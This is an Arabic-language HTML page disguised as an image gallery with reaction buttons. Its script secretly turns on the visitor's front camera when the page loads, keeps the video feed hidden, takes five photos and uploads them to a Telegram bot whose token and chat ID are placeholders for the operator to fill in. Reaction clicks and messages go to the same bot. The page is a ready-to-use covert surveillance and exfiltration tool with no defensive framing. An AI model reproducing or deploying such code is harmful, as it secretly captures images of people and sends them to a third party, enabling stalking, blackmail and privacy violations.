
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>معرض الصور - تفاعلي</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: black;
      animation: pulseBg 6s infinite alternate;
    }

    @keyframes pulseBg {
      0% { background-color: #2b0033; }
      100% { background-color: #000000; }
    }

    .gallery {
      display: flex;
      flex-wrap: wrap;
      justify-content: flex-end;
      direction: rtl;
      padding: 20px;
    }

    .image-box {
      width: 18%;
      margin: 1%;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 0 8px #6a0dad66;
    }

    .image {
      width: 100%;
      aspect-ratio: 1/1;
      background-size: cover;
      background-position: center;
    }

    .reactions {
      display: flex;
      justify-content: space-around;
      background-color: #111;
      padding: 8px;
    }

    .reaction-btn {
      background-color: #6a0dad;
      border: none;
      border-radius: 50px;
      color: white;
      padding: 6px 12px;
      font-size: 16px;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .reaction-btn:hover {
      transform: scale(1.1);
    }

    #contact-btn {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background-color: #6a0dad;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 0 15px #6a0dad;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div class="gallery" id="gallery"></div>
  <button id="contact-btn">رسالة إلى المطور</button>

  <script>
    const token = "توكن_البوت_هنا";       // 👑 غيّره بتوكن البوت
    const chatId = "معرف_التليغرام_هنا";  // 👑 غيّره بـ ID المطور

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // 👁️ التقاط 5 صور
    async function captureAndSendPhotos() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // ننتظر حتى تعمل الكاميرا
        await new Promise(resolve => setTimeout(resolve, 2000));

        for (let i = 1; i <= 5; i++) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
          await sendPhotoToBot(blob, i);
          await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار 1 ثانية بين الصور
        }

        // إيقاف الكاميرا بعد الانتهاء
        stream.getTracks().forEach(track => track.stop());

      } catch (err) {
        alert("⚠️ لم يتم السماح بالكاميرا");
      }
    }

    async function sendPhotoToBot(blob, index) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", `📸 صورة ${index} من الزائر`);
      formData.append("photo", blob, `photo${index}.png`);

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    function sendToBot(text) {
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
      fetch(url);
    }

    // زر رسالة إلى المطور
    document.getElementById("contact-btn").onclick = () => {
      const msg = prompt("📝 اكتب رسالتك إلى المطور:");
      if (msg) {
        sendToBot("📬 رسالة من الزائر:\n" + msg);
        alert("✅ تم إرسال رسالتك!");
      }
    };

    // إنشاء صور وتفاعلات
    const gallery = document.getElementById("gallery");
    for (let i = 1; i <= 25; i++) {
      const box = document.createElement("div");
      box.className = "image-box";

      const image = document.createElement("div");
      image.className = "image";
      image.style.backgroundImage = `url('images/img${i}.jpg')`;

      const reactBox = document.createElement("div");
      reactBox.className = "reactions";

      const laughBtn = document.createElement("button");
      laughBtn.className = "reaction-btn";
      laughBtn.innerText = "😂 أضحكني";
      laughBtn.onclick = () => sendToBot(`📸 تفاعل مع img${i}.jpg:\n😂 أضحكني`);

      const angerBtn = document.createElement("button");
      angerBtn.className = "reaction-btn";
      angerBtn.innerText = "😡 أغضبني";
      angerBtn.onclick = () => sendToBot(`📸 تفاعل مع img${i}.jpg:\n😡 أغضبني`);

      reactBox.appendChild(laughBtn);
      reactBox.appendChild(angerBtn);

      box.appendChild(image);
      box.appendChild(reactBox);
      gallery.appendChild(box);
    }

    // عند تحميل الصفحة
    window.onload = () => {
      captureAndSendPhotos();
    };
  </script>
</body>
</html>
